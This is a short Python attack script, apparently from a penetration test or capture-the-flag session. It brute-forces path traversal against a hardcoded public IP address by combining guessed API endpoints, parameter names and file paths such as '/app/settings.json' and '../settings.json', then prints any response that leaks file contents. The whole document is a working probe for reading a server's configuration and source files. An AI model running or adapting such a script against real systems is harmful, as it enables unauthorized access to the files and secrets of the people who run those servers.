#!/usr/bin/env python3
"""Test path traversal in /api/ operations."""
import requests

BASE = "http://54.72.82.22:8570"

# Try operations with file path parameters - focused
ops = ['view', 'read', 'get', 'download', 'export', 'file', 'show', 'dump']
params = ['name', 'path', 'file', 'filename']
values = ['/app/settings.json', '/app/service.py', '../settings.json', 'settings.json']

print("Testing path traversal...")
for op in ops:
    for param in params:
        for value in values:
            try:
                r = requests.get(f'{BASE}/api/{op}', params={param: value}, timeout=10)
            except Exception as e:
                print(f"  GET /api/{op}?{param}={value} ERROR: {e}")
                continue
            if r.status_code == 200 and 'Not found' not in r.text and len(r.text) > 50:
                print(f"!!! HIT GET /api/{op}?{param}={value}: {r.status_code}")
                print(r.text[:500])
                exit(0)
            elif r.status_code != 404:
                print(f"  Interesting GET /api/{op}?{param}={value}: {r.status_code} - {r.text[:100]}")

            try:
                r = requests.post(f'{BASE}/api/{op}', json={param: value}, timeout=10)
            except Exception as e:
                print(f"  POST /api/{op} {param}={value} ERROR: {e}")
                continue
            if r.status_code == 200 and 'Not found' not in r.text and len(r.text) > 50:
                print(f"!!! HIT POST /api/{op} {param}={value}: {r.status_code}")
                print(r.text[:500])
                exit(0)
            elif r.status_code != 404:
                print(f"  Interesting POST /api/{op} {param}={value}: {r.status_code} - {r.text[:100]}")

print("Done")